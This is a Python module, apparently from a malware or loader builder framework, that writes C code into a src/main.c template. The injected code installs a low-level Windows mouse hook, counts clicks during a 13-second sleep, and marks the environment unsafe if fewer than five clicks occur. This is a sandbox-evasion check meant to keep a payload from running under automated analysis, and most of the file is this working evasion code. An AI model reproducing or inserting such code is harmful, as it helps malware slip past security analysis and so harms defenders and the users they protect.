def desc():
    return "Check if user clicks the mouse x times to detect sanboxes"

def run():
    libs = '''\
#define TIME_DELAY 13000 //13 seconds
#define MIN_CLICKS_NUM 5

// Global hook handle variable
HHOOK g_hMouseHook      = NULL;
// Global mouse clicks counter
DWORD g_dwMouseClicks   = NULL;
'''

    functions = '''\
// The callback function that will be executed whenever the user clicked a mouse button
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam){

    // WM_RBUTTONDOWN :         "Right Mouse Click"
    // WM_LBUTTONDOWN :         "Left Mouse Click"
    // WM_MBUTTONDOWN :         "Middle Mouse Click"

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger(){
    
    MSG         Msg         = { 0 };

    // Installing hook 
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        return FALSE;
    }

    // Process unhandled events
    while (GetMessageW(&Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }
    
    return TRUE;
}

//Check for Mouse Movement
int checkMouseClicks() {
	HANDLE  hThread         = NULL;
    DWORD   dwThreadId      = NULL;

    // running the hooking function in a seperate thread for 'TIME_DELAY' ms
    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, &dwThreadId);
    if (hThread) {
        // If this sleep is fast forwarded then the mouse clicks
        // remains the same and therefore detects a sandbox env
        Sleep(TIME_DELAY);
    }

    // unhooking
    if (g_hMouseHook) {
        !UnhookWindowsHookEx(g_hMouseHook);
    }

	return (g_dwMouseClicks < MIN_CLICKS_NUM);
}
'''

    keying = '''\
	if (checkMouseClicks())
		SafeEnv = FALSE;\
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{KEYING}}", keying + "\n{{KEYING}}")

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

    return